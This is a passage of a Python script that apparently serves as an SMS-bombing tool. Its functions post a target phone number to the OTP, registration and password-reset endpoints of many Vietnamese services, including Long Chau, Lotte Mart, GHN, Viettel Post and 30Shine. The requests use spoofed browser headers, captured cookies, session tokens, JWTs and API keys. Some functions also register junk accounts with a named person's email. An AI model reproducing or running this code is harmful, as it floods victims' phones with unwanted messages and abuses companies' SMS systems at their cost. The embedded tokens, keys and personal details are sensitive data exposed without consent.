    'Origin': 'https://emartmall.com.vn',
    'Pragma': 'no-cache',
    'Referer': 'https://emartmall.com.vn/index.php?route=account/register',
    'Sec-Fetch-Dest': 'empty',
    'Sec-Fetch-Mode': 'cors',
    'Sec-Fetch-Site': 'same-origin',
    'User-Agent': 'Mozilla/5.0 (iPhone; CPU iPhone OS 13_2_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.0.3 Mobile/15E148 Safari/604.1',
    'X-Requested-With': 'XMLHttpRequest',
}

    data = {
    'mobile': phone,
}

    response = requests.post(
    'https://emartmall.com.vn/index.php?route=account/register/smsRegister',
    cookies=cookies,
    headers=headers,
    data=data,
)

def vayvnd(phone):
    cookies = {
    '_ym_uid': '1690554219913867740',
    '_ym_d': '1710341879',
    '_fbp': 'fb.1.1720103209034.327083033864980369',
    '_gcl_au': '1.1.2098605329.1720103209',
    '_ga_P2783EHVX2': 'GS1.1.1720103209.1.0.1720103209.60.0.0',
    '_ga': 'GA1.2.1065309191.1720103210',
    '_gid': 'GA1.2.543071985.1720103210',
    '_gat_UA-151110385-1': '1',
    '_tt_enable_cookie': '1',
    '_ttp': 'G5FqQUKlNy_Fx9r4kURNmkn6LOo',
    '_ym_visorc': 'b',
    '_ym_isad': '2',
}

    headers = {
    'accept': 'application/json',
    'accept-language': 'vi-VN',
    'cache-control': 'no-cache',
    'content-type': 'application/json; charset=utf-8',
    # 'cookie': '_ym_uid=1690554219913867740; _ym_d=1710341879; _fbp=fb.1.1720103209034.327083033864980369; _gcl_au=1.1.2098605329.1720103209; _ga_P2783EHVX2=GS1.1.1720103209.1.0.1720103209.60.0.0; _ga=GA1.2.1065309191.1720103210; _gid=GA1.2.543071985.1720103210; _gat_UA-151110385-1=1; _tt_enable_cookie=1; _ttp=G5FqQUKlNy_Fx9r4kURNmkn6LOo; _ym_visorc=b; _ym_isad=2',
    'origin': 'https://vayvnd.vn',
    'pragma': 'no-cache',
    'priority': 'u=1, i',
    'referer': 'https://vayvnd.vn/',
    'sec-ch-ua': '"Not/A)Brand";v="8", "Chromium";v="126", "Google Chrome";v="126"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '"Windows"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'same-site',
    'site-id': '3',
    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36',
}

    json_data = {
    'login': phone,
    'trackingId': '8Y6vKPEgdnxhamRfAJw7IrW3nwVYJ6BHzIdygaPd1S9urrRIVnFibuYY0udN46Z3',
}

    response = requests.post('https://api.vayvnd.vn/v2/users/password-reset', cookies=cookies, headers=headers, json=json_data)
def kingz(phone):
    headers = {
    'accept': '*/*',
    'accept-language': 'vi,vi-VN;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5',
    'authorization': '',
    'cache-control': 'no-cache',
    'content-type': 'application/json',
    'domain': 'kingfoodmart',
    'origin': 'https://kingfoodmart.com',
    'pragma': 'no-cache',
    'priority': 'u=1, i',
    'referer': 'https://kingfoodmart.com/',
    'sec-ch-ua': '"Not/A)Brand";v="8", "Chromium";v="126", "Google Chrome";v="126"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '"Windows"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'cross-site',
    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36',
}

    json_data = {
    'operationName': 'SendOTP',
    'variables': {
        'phone': phone,
    },
    'query': 'mutation SendOTP($phone: String!) {\n  sendOtp(input: {phone: $phone, captchaSignature: "", email: ""}) {\n    otpTrackingId\n    __typename\n  }\n}',
}

    response = requests.post('https://api.onelife.vn/v1/gateway/', headers=headers, json=json_data)

def ghn(phone):
    headers = {
    'authority': 'online-gateway.ghn.vn',
    'accept': 'application/json, text/plain, */*',
    'accept-language': 'vi,vi-VN;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5',
    'cache-control': 'no-cache',
    'content-type': 'application/json',
    'origin': 'https://sso.ghn.vn',
    'pragma': 'no-cache',
    'referer': 'https://sso.ghn.vn/',
    'sec-ch-ua': '"Not/A)Brand";v="99", "Google Chrome";v="115", "Chromium";v="115"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '"Windows"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'same-site',
    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36',
}

    json_data = {
    'phone': phone,
    'type': 'register',
}

    response = requests.post('https://online-gateway.ghn.vn/sso/public-api/v2/client/sendotp', headers=headers, json=json_data)
def gala(phone):
    headers = {
    'accept': '*/*',
    'accept-language': 'vi',
    'access-token': 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzaWQiOiI5M2RhNGUwNC00YWIwLTRiMDYtOTc4Ni01NjNlNjY1ZTU5NmIiLCJkaWQiOiI3ODNhMTcyNy02ZDFlLTRjZWMtYmU1OS0zNjViMmU1MWQxN2QiLCJpcCI6IjEuNTIuMTc1LjEzNiIsIm1pZCI6Ik5vbmUiLCJwbHQiOiJ3ZWJ8bW9iaWxlfHdpbmRvd3N8MTB8Y2hyb21lIiwiYXBwX3ZlcnNpb24iOiIyLjAuMCIsImlhdCI6MTcyMDEwNjEwMSwiZXhwIjoxNzM1NjU4MTAxfQ.TzzMuAseNbVYaSuWz5ufu4lEn9Uj_hrxh1aYxHyleJQ',
    'cache-control': 'no-cache',
    # 'content-length': '0',
    'origin': 'https://galaxyplay.vn',
    'pragma': 'no-cache',
    'priority': 'u=1, i',
    'referer': 'https://galaxyplay.vn/',
    'sec-ch-ua': '"Not/A)Brand";v="8", "Chromium";v="126", "Google Chrome";v="126"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '"Windows"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'cross-site',
    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36',
    'x-requested-with': 'XMLHttpRequest',
}

    params = {
    'phone': phone,
}

    response = requests.post('https://api.glxplay.io/account/phone/verify', params=params, headers=headers)

def lon(phone):
    headers = {
    'accept': 'application/json, text/plain, */*',
    'accept-language': 'vi,vi-VN;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5',
    'access-control-allow-origin': '*',
    'cache-control': 'no-cache',
    'content-type': 'application/json',
    'order-channel': '1',
    'origin': 'https://nhathuoclongchau.com.vn',
    'pragma': 'no-cache',
    'priority': 'u=1, i',
    'referer': 'https://nhathuoclongchau.com.vn/',
    'sec-ch-ua': '"Not/A)Brand";v="8", "Chromium";v="126", "Google Chrome";v="126"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '"Windows"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'same-site',
    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36',
    'x-channel': 'EStore',
}

    json_data = {
    'phoneNumber': phone,
    'otpType': 0,
    'fromSys': 'WEBKHLC',
}

    response = requests.post(
    'https://api.nhathuoclongchau.com.vn/lccus/is/user/new-send-verification',
    headers=headers,
    json=json_data,
)

def medicare(phone):
    cookies = {
    'SERVER': 'nginx3',
    '_gcl_au': '1.1.2035327165.1720297698',
    'XSRF-TOKEN': 'eyJpdiI6Im15a3BJL0ZqODArK0l1VS9FOTFneFE9PSIsInZhbHVlIjoiNDFUelQ3T0lBQmdqbEpmYmxyU29rSStpQ1ZhdUl6UndMSEpHSkJLclRpWnI0c0ZBNDRYQnpHK0kxdGNXcFpMMHFuM0lVZHpmeWNWamtYS1MwdEVYRHQ1THVhZ3Z6amRtMUVkN1ZWTEozV3B5NXJBWmlrZHduUXZPTUg3aW1uemkiLCJtYWMiOiJlYjMzMmQ4N2YzNTQyODAxMWQ2YTYxYjFiYzhhNGMxMmFiMmE3ZTFiMGNkNTYwNDM2MGM3ZDVhZDcyZGJlYTY4IiwidGFnIjoiIn0%3D',
    'medicare_session': 'eyJpdiI6IjBQU2VzVHhNbWVSd0VJcHNMZWxJMHc9PSIsInZhbHVlIjoiUkNEODVKa1c1aHkyeldKMCtkVG5aTVBISVhXdmNYY2tpMktucFBWa2F3Z3UwYkZhMHczRnRSK2c5Ui9PblV4Tzczc1dZQy9GNWJvUktYWTBEd1pWa3dyN3JsRnowQjRRY2hOKzQ4OU1wbDhLOEhHcWcvWDVWeGxTOC9VSkVlZnUiLCJtYWMiOiI0YzFlYWE4NDQ5MGYzZGRmNGVjODQ2ZjBhMDdkZTJjNjFiNGIwMmFhMTYwMTYwOGJjNmUzOTNiMTI5MzUxZjllIiwidGFnIjoiIn0%3D',
    '_ga': 'GA1.2.510182867.1720297701',
    '_gid': 'GA1.2.1839608181.1720297709',
    '_gat_gtag_UA_257373458_1': '1',
    '_fbp': 'fb.1.1720297708926.352505189707594376',
    '_ga_CEMYNHNKQ2': 'GS1.1.1720297700.1.1.1720297727.0.0.0',
    '_ga_8DLTVS911W': 'GS1.1.1720297700.1.1.1720297727.0.0.0',
    '_ga_R7XKMTVGEW': 'GS1.1.1720297700.1.1.1720297727.33.0.0',
}

    headers = {
    'Accept': 'application/json, text/plain, */*',
    'Accept-Language': 'vi,vi-VN;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5',
    'Cache-Control': 'no-cache',
    'Connection': 'keep-alive',
    'Content-Type': 'application/json',
    # 'Cookie': 'SERVER=nginx3; _gcl_au=1.1.2035327165.1720297698; XSRF-TOKEN=eyJpdiI6Im15a3BJL0ZqODArK0l1VS9FOTFneFE9PSIsInZhbHVlIjoiNDFUelQ3T0lBQmdqbEpmYmxyU29rSStpQ1ZhdUl6UndMSEpHSkJLclRpWnI0c0ZBNDRYQnpHK0kxdGNXcFpMMHFuM0lVZHpmeWNWamtYS1MwdEVYRHQ1THVhZ3Z6amRtMUVkN1ZWTEozV3B5NXJBWmlrZHduUXZPTUg3aW1uemkiLCJtYWMiOiJlYjMzMmQ4N2YzNTQyODAxMWQ2YTYxYjFiYzhhNGMxMmFiMmE3ZTFiMGNkNTYwNDM2MGM3ZDVhZDcyZGJlYTY4IiwidGFnIjoiIn0%3D; medicare_session=eyJpdiI6IjBQU2VzVHhNbWVSd0VJcHNMZWxJMHc9PSIsInZhbHVlIjoiUkNEODVKa1c1aHkyeldKMCtkVG5aTVBISVhXdmNYY2tpMktucFBWa2F3Z3UwYkZhMHczRnRSK2c5Ui9PblV4Tzczc1dZQy9GNWJvUktYWTBEd1pWa3dyN3JsRnowQjRRY2hOKzQ4OU1wbDhLOEhHcWcvWDVWeGxTOC9VSkVlZnUiLCJtYWMiOiI0YzFlYWE4NDQ5MGYzZGRmNGVjODQ2ZjBhMDdkZTJjNjFiNGIwMmFhMTYwMTYwOGJjNmUzOTNiMTI5MzUxZjllIiwidGFnIjoiIn0%3D; _ga=GA1.2.510182867.1720297701; _gid=GA1.2.1839608181.1720297709; _gat_gtag_UA_257373458_1=1; _fbp=fb.1.1720297708926.352505189707594376; _ga_CEMYNHNKQ2=GS1.1.1720297700.1.1.1720297727.0.0.0; _ga_8DLTVS911W=GS1.1.1720297700.1.1.1720297727.0.0.0; _ga_R7XKMTVGEW=GS1.1.1720297700.1.1.1720297727.33.0.0',
    'Origin': 'https://medicare.vn',
    'Pragma': 'no-cache',
    'Referer': 'https://medicare.vn/login',
    'Sec-Fetch-Dest': 'empty',
    'Sec-Fetch-Mode': 'cors',
    'Sec-Fetch-Site': 'same-origin',
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36',
    'X-XSRF-TOKEN': 'eyJpdiI6Im15a3BJL0ZqODArK0l1VS9FOTFneFE9PSIsInZhbHVlIjoiNDFUelQ3T0lBQmdqbEpmYmxyU29rSStpQ1ZhdUl6UndMSEpHSkJLclRpWnI0c0ZBNDRYQnpHK0kxdGNXcFpMMHFuM0lVZHpmeWNWamtYS1MwdEVYRHQ1THVhZ3Z6amRtMUVkN1ZWTEozV3B5NXJBWmlrZHduUXZPTUg3aW1uemkiLCJtYWMiOiJlYjMzMmQ4N2YzNTQyODAxMWQ2YTYxYjFiYzhhNGMxMmFiMmE3ZTFiMGNkNTYwNDM2MGM3ZDVhZDcyZGJlYTY4IiwidGFnIjoiIn0=',
    'sec-ch-ua': '"Not/A)Brand";v="8", "Chromium";v="126", "Google Chrome";v="126"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '"Windows"',
}

    json_data = {
    'mobile': phone,
    'mobile_country_prefix': '84',
}

    response = requests.post('https://medicare.vn/api/otp', cookies=cookies, headers=headers, json=json_data)
def lote(phone):
    cookies = {
    '__Host-next-auth.csrf-token': '2c95aedbe3b2a7070c6b91899b2ae8c85931edffbc5f53bf3ceaa177f1a204be%7C5b2082aa598f7c2d9802014b5fabfcd523af03e4738af10baf6ca96063c440b6',
    '__Secure-next-auth.callback-url': 'https%3A%2F%2Fwww.lottemart.vn',
    '_gcl_au': '1.1.2136712951.1720299022',
    '_ga': 'GA1.1.164372556.1720299023',
    '_fbp': 'fb.1.1720299024438.549668172235070425',
    '_ga_6QLJ7DM4XW': 'GS1.1.1720299022.1.1.1720299051.31.0.0',
}

    headers = {
    'accept': 'application/json',
    'accept-language': 'vi,vi-VN;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5',
    'cache-control': 'no-cache',
    'content-type': 'application/json',
    # 'cookie': '__Host-next-auth.csrf-token=2c95aedbe3b2a7070c6b91899b2ae8c85931edffbc5f53bf3ceaa177f1a204be%7C5b2082aa598f7c2d9802014b5fabfcd523af03e4738af10baf6ca96063c440b6; __Secure-next-auth.callback-url=https%3A%2F%2Fwww.lottemart.vn; _gcl_au=1.1.2136712951.1720299022; _ga=GA1.1.164372556.1720299023; _fbp=fb.1.1720299024438.549668172235070425; _ga_6QLJ7DM4XW=GS1.1.1720299022.1.1.1720299051.31.0.0',
    'origin': 'https://www.lottemart.vn',
    'pragma': 'no-cache',
    'priority': 'u=1, i',
    'referer': 'https://www.lottemart.vn/signup?callbackUrl=https://www.lottemart.vn/',
    'sec-ch-ua': '"Not/A)Brand";v="8", "Chromium";v="126", "Google Chrome";v="126"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '"Windows"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'same-origin',
    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36',
}

    json_data = {
    'username': phone,
    'case': 'register',
}

    response = requests.post(
    'https://www.lottemart.vn/v1/p/mart/bos/vi_nsg/V1/mart-sms/sendotp',
    cookies=cookies,
    headers=headers,
    json=json_data,
)
def hsv_tech(phone):
    headers = {
    'accept': 'application/json, text/plain, */*',
    'accept-language': 'vi',
    'cache-control': 'no-cache',
    'content-type': 'application/json',
    'key': '441e8136801b70ac87887bca16dd298f',
    'origin': 'https://thefaceshop.com.vn',
    'pragma': 'no-cache',
    'priority': 'u=1, i',
    'referer': 'https://thefaceshop.com.vn/',
    'sec-ch-ua': '"Not/A)Brand";v="8", "Chromium";v="126", "Google Chrome";v="126"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '"Windows"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'cross-site',
    'timestamp': '1720623654086',
    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36',
}

    json_data = {
    'phoneNumber': phone,
}

    response = requests.post(
    'https://tfs-api.hsv-tech.io/client/phone-verification/request-verification',
    headers=headers,
    json=json_data,
)

def vato(phone):
    headers = {
    'accept': 'application/json',
    'accept-language': 'vi,vi-VN;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5',
    'cache-control': 'no-cache',
    'content-type': 'application/json',
    'origin': 'https://futabus.vn',
    'pragma': 'no-cache',
    'priority': 'u=1, i',
    'referer': 'https://futabus.vn/',
    'sec-ch-ua': '"Not/A)Brand";v="8", "Chromium";v="126", "Google Chrome";v="126"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '"Windows"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'cross-site',
    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36',
    'x-access-token': 'eyJhbGciOiJSUzI1NiIsImtpZCI6IjU2OTFhMTk1YjI0MjVlMmFlZDYwNjMzZDdjYjE5MDU0MTU2Yjk3N2QiLCJ0eXAiOiJKV1QifQ.eyJhbm9ueW1vdXMiOnRydWUsImlwIjoiOjoxIiwidXNlcl9hZ2VudCI6Ik1vemlsbGEvNS4wIChXaW5kb3dzIE5UIDEwLjA7IFdpbjY0OyB4NjQpIEFwcGxlV2ViS2l0LzUzNy4zNiAoS0hUTUwsIGxpa2UgR2Vja28pIENocm9tZS8xMTQuMC4wLjAgU2FmYXJpLzUzNy4zNiIsImlzcyI6Imh0dHBzOi8vc2VjdXJldG9rZW4uZ29vZ2xlLmNvbS9mYWNlY2FyLTI5YWU3IiwiYXVkIjoiZmFjZWNhci0yOWFlNyIsImF1dGhfdGltZSI6MTcyMDYyMDYyMywidXNlcl9pZCI6InNFMkk1dkg3TTBhUkhWdVl1QW9QaXByczZKZTIiLCJzdWIiOiJzRTJJNXZIN00wYVJIVnVZdUFvUGlwcnM2SmUyIiwiaWF0IjoxNzIwNjIwNjIzLCJleHAiOjE3MjA2MjQyMjMsImZpcmViYXNlIjp7ImlkZW50aXRpZXMiOnt9LCJzaWduX2luX3Byb3ZpZGVyIjoiY3VzdG9tIn19.YR8S04KR7mVRqL68o-a-6svQibV5Gpx8ciD-oxmm3zYMYN55FIAzZPkaZ2rlFaNpGwGl5AkuTWgoVVTU5uTttWOADhoWhOMdICkz811oPzQcjVA0VVG2r7Vg6vVOuKdg3jbD6SJ0ySj6Ln96nI-kcy6Q_169sGYxKIGwknsfM91-NnFRi_D_xNulys0i4OxqRdHxpK42VRkzyl0hwj0sS-cd5i84MT8MtiyOZRhn9J89tMLkHVP5NAyDfHtjm3UYmJYbBRQQf-iaT2nu36AZ_dNRT6rtQuqNpk0vyCIEdPo-9t6cKhaW-I69DBcz5d73fleRTM3zHD-5DlJkpkcWKA',
    'x-app-id': 'client',
}

    json_data = {
    'phoneNumber': phone,
    'deviceId': 'e3025fb7-5436-4002-9950-e6564b3656a6',
    'use_for': 'LOGIN',
}

    response = requests.post('https://api.vato.vn/api/authenticate/request_code', headers=headers, json=json_data)
def beauty(phone):
    headers = {
    'accept': 'application/json, text/plain, */*',
    'accept-language': 'vi',
    'cache-control': 'no-cache',
    'content-type': 'application/json',
    'key': '584294d68530c7b753d7f5a77c1ddbc2',
    'origin': 'https://beautybox.com.vn',
    'pragma': 'no-cache',
    'priority': 'u=1, i',
    'referer': 'https://beautybox.com.vn/',
    'sec-ch-ua': '"Not/A)Brand";v="8", "Chromium";v="126", "Google Chrome";v="126"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '"Windows"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'cross-site',
    'timestamp': '1720624059192',
    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36',
}

    json_data = {
    'phoneNumber': phone,
}

    response = requests.post(
    'https://beautybox-api.hsv-tech.io/client/phone-verification/request-verification',
    headers=headers,
    json=json_data,
)
def hoanvu(phone):
    headers = {
    'accept': 'application/json, text/plain, */*',
    'accept-language': 'vi',
    'cache-control': 'no-cache',
    'content-type': 'application/json',
    'key': '028601f79dcc724ef8b8e7c989c5f649',
    'origin': 'https://reebok.com.vn',
    'pragma': 'no-cache',
    'priority': 'u=1, i',
    'referer': 'https://reebok.com.vn/',
    'sec-ch-ua': '"Not/A)Brand";v="8", "Chromium";v="126", "Google Chrome";v="126"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '"Windows"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'cross-site',
    'timestamp': '1720624197351',
    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36',
}

    json_data = {
    'phoneNumber': phone,
}

    response = requests.post(
    'https://reebok-api.hsv-tech.io/client/phone-verification/request-verification',
    headers=headers,
    json=json_data,
)
def tokyo(phone):
    headers = {
    'accept': 'application/json, text/plain, */*',
    'accept-language': 'vi,vi-VN;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5',
    'cache-control': 'no-cache',
    'content-type': 'application/json',
    'origin': 'https://tokyolife.vn',
    'pragma': 'no-cache',
    'priority': 'u=1, i',
    'referer': 'https://tokyolife.vn/',
    'sec-ch-ua': '"Not/A)Brand";v="8", "Chromium";v="126", "Google Chrome";v="126"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '"Windows"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'same-site',
    'signature': 'c1336d4c72c0b857cdd6aab4de261aa3',
    'timestamp': '1720624468348',
    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36',
}

    json_data = {
    'phone_number': phone,
    'name': 'khải nguyễn',
    'password': 'vjyy1234',
    'email': 'trongkhai1118@gmail.com',
    'birthday': '2002-07-10',
    'gender': 'female',
}

    response = requests.post('https://api-prod.tokyolife.vn/khachhang-api/api/v1/auth/register', headers=headers, json=json_data)

def vtpost(phone):
    cookies = {
    '_gid': 'GA1.2.620335128.1720627303',
    '_gat_gtag_UA_128396571_2': '1',
    'QUIZIZZ_WS_COOKIE': 'id_192.168.12.141_15001',
    '.AspNetCore.Antiforgery.XvyenbqPRmk': 'CfDJ8ASZJlA33dJMoWx8wnezdv_KN5bT4QKXiMPZaUMqRiF_EEbvz-ub2OfOxFsWqfP5oyWQZfbAj-YmrKoW5q2we2B85fBpeffjr6w1vgncGlK11bclPhcrNb-yY6eMuSkQFZ887kHXkBgVaHZVnb06mjY',
    '_ga_9NGCREH08E': 'GS1.1.1720627303.1.0.1720627304.59.0.0',
    '_gat_gtag_UA_146347905_1': '1',
    '_gat_gtag_UA_142538724_1': '1',
    '_ga_7RZCEBC0S6': 'GS1.1.1720627304.1.1.1720627306.0.0.0',
    '_ga_WN26X24M50': 'GS1.1.1720627305.1.1.1720627306.0.0.0',
    '_ga': 'GA1.1.278441667.1720627303',
    '_ga_P86KBF64TN': 'GS1.1.1720627305.1.1.1720627319.0.0.0',
}

    headers = {
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
    'Accept-Language': 'vi,vi-VN;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5',
    'Cache-Control': 'no-cache',
    'Connection': 'keep-alive',
    'Content-Type': 'application/x-www-form-urlencoded',
    # 'Cookie': '_gid=GA1.2.620335128.1720627303; _gat_gtag_UA_128396571_2=1; QUIZIZZ_WS_COOKIE=id_192.168.12.141_15001; .AspNetCore.Antiforgery.XvyenbqPRmk=CfDJ8ASZJlA33dJMoWx8wnezdv_KN5bT4QKXiMPZaUMqRiF_EEbvz-ub2OfOxFsWqfP5oyWQZfbAj-YmrKoW5q2we2B85fBpeffjr6w1vgncGlK11bclPhcrNb-yY6eMuSkQFZ887kHXkBgVaHZVnb06mjY; _ga_9NGCREH08E=GS1.1.1720627303.1.0.1720627304.59.0.0; _gat_gtag_UA_146347905_1=1; _gat_gtag_UA_142538724_1=1; _ga_7RZCEBC0S6=GS1.1.1720627304.1.1.1720627306.0.0.0; _ga_WN26X24M50=GS1.1.1720627305.1.1.1720627306.0.0.0; _ga=GA1.1.278441667.1720627303; _ga_P86KBF64TN=GS1.1.1720627305.1.1.1720627319.0.0.0',
    'Origin': 'null',
    'Pragma': 'no-cache',
    'Sec-Fetch-Dest': 'document',
    'Sec-Fetch-Mode': 'navigate',
    'Sec-Fetch-Site': 'same-origin',
    'Sec-Fetch-User': '?1',
    'Upgrade-Insecure-Requests': '1',
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36',
    'sec-ch-ua': '"Not/A)Brand";v="8", "Chromium";v="126", "Google Chrome";v="126"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '"Windows"',
}

    data = {
    'FormRegister.FullName': 'Taylor Jasmine',
    'FormRegister.Phone': phone,
    'FormRegister.Password': 'vjyy1234',
    'FormRegister.ConfirmPassword': 'vjyy1234',
    'ReturnUrl': '/connect/authorize/callback?client_id=vtp.web&secret=vtp-web&scope=openid%20profile%20se-public-api%20offline_access&response_type=id_token%20token&state=abc&redirect_uri=https%3A%2F%2Fviettelpost.vn%2Fstart%2Flogin&nonce=s7oqj3gkapi06ddxfymrhcs',
    'ConfirmOtpType': 'Register',
    'FormRegister.IsRegisterFromPhone': 'true',
    '__RequestVerificationToken': 'CfDJ8ASZJlA33dJMoWx8wnezdv8MNiql6Angxj2aQkKc6E7R0IbTO0WlQgNkTmu1FXJfLeYLf3huG-7Bwm56zhIf_24enfQeQw_ZU0U3j7lUGSruoA3rf6J9q21R09mQjT1SH5SlPYbamWpErWJe9T5YsuQ',
}

    response = requests.post('https://id.viettelpost.vn/Account/SendOTPByPhone', cookies=cookies, headers=headers, data=data)

def shine(phone):
    headers = {
    'accept': 'application/json',
    'accept-language': 'vi,vi-VN;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5',
    'authorization': '',
    'cache-control': 'no-cache',
    'content-type': 'application/json',
    'origin': 'https://30shine.com',
    'pragma': 'no-cache',
    'priority': 'u=1, i',
    'referer': 'https://30shine.com/',
    'sec-ch-ua': '"Not/A)Brand";v="8", "Chromium";v="126", "Google Chrome";v="126"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '"Windows"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'cross-site',
    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36',
}

    json_data = {
    'phone': phone,
}

    response = requests.post(
    'https://ls6trhs5kh.execute-api.ap-southeast-1.amazonaws.com/Prod/otp/send',
    headers=headers,
    json=json_data,
)

bien_global = ""
def dkimu(phone):
    global bien_global
    headers = {
    'Accept': 'application/json, text/plain, */*',
    'Accept-Language': 'vi,vi-VN;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5',
    'Authorization': 'Bearer 226b116857c2788c685c66bf601222b56bdc3751b4f44b944361e84b2b1f002b',
    'Cache-Control': 'no-cache',
    'Connection': 'keep-alive',
    'Content-Type': 'application/json',
    'Origin': 'https://mutosi.com',
    'Pragma': 'no-cache',
    'Referer': 'https://mutosi.com/',
    'Sec-Fetch-Dest': 'empty',
    'Sec-Fetch-Mode': 'cors',
    'Sec-Fetch-Site': 'same-site',
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36',
    'sec-ch-ua': '"Not/A)Brand";v="8", "Chromium";v="126", "Google Chrome";v="126"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '"Windows"',
}

    json_data = {
    'name': 'hoang lo',
    'phone': phone,
    'password': 'Vjyy1234@',
    'confirm_password': 'Vjyy1234@',
    'firstname': None,
    'lastname': None,
    'verify_otp': 0,
    'store_token': '226b116857c2788c685c66bf601222b56bdc3751b4f44b944361e84b2b1f002b',
    'email': 'dđ@gmail.com',
    'birthday': '2006-02-13',
    'accept_the_terms': 1,
    'receive_promotion': 1,
}

    response = requests.post('https://api-omni.mutosi.com/client/auth/register', headers=headers, json=json_data).json()
    try:
      bien_global = response["token"]
    except:
      bien_global = ""
    
  

def otpmu(phone):
    headers = {
    'Accept': 'application/json, text/plain, */*',
    'Accept-Language': 'vi,vi-VN;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5',
    'Authorization': 'Bearer 226b116857c2788c685c66bf601222b56bdc3751b4f44b944361e84b2b1f002b',
    'Cache-Control': 'no-cache',
    'Connection': 'keep-alive',
